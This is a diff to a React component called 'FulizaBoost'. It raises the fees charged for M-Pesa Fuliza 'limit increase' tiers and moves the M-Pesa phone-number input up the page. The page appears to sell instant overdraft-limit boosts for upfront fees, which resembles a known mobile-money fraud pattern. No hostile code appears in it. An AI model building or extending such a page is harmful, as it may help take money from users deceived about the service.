@@ -9,15 +9,15 @@ type Limit = {
 };
 
 const limits: Limit[] = [
-  { id: "l1", amount: 5000, fee: 49 },
-  { id: "l2", amount: 7500, fee: 80 },
-  { id: "l3", amount: 10000, fee: 120 },
-  { id: "l4", amount: 12500, fee: 140 },
-  { id: "l5", amount: 16000, fee: 180 },
-  { id: "l6", amount: 21000, fee: 200 },
-  { id: "l7", amount: 25500, fee: 220 },
-  { id: "l8", amount: 30000, fee: 350 },
-  { id: "l9", amount: 35000, fee: 420 },
+  { id: "l1", amount: 5000, fee: 150 },
+  { id: "l2", amount: 7500, fee: 180 },
+  { id: "l3", amount: 10000, fee: 200 },
+  { id: "l4", amount: 12500, fee: 230 },
+  { id: "l5", amount: 16000, fee: 250 },
+  { id: "l6", amount: 21000, fee: 300 },
+  { id: "l7", amount: 25500, fee: 350 },
+  { id: "l8", amount: 30000, fee: 400 },
+  { id: "l9", amount: 35000, fee: 450 },
   { id: "l10", amount: 40000, fee: 540 },
   { id: "l11", amount: 45000, fee: 680 },
   { id: "l12", amount: 50000, fee: 960 },
@@ -92,6 +92,17 @@ export default function FulizaBoost() {
             Instant Limit Increase • No Paperwork • Same Day Access
           </p>
         </div>
+        
+        {/* Phone Input */}
+        <div className="px-4 mt-6">
+          <input
+            type="tel"
+            placeholder="Enter M-Pesa number"
+            value={phone}
+            onChange={(e) => setPhone(e.target.value)}
+            className="w-full border rounded-xl p-3 text-sm focus:ring-2 focus:ring-blue-500 outline-none"
+          />
+        </div>
 
         {/* Info Box */}
         <div className="bg-white mx-4 mt-6 p-4 rounded-2xl border text-sm text-gray-600">
@@ -137,16 +148,6 @@ export default function FulizaBoost() {
           ))}
         </div>
 
-        {/* Phone Input */}
-        <div className="px-4 mt-6">
-          <input
-            type="tel"
-            placeholder="Enter M-Pesa number"
-            value={phone}
-            onChange={(e) => setPhone(e.target.value)}
-            className="w-full border rounded-xl p-3 text-sm focus:ring-2 focus:ring-blue-500 outline-none"
-          />
-        </div>
 
         {/* Continue Button */}
         <div className="px-4 mt-4">
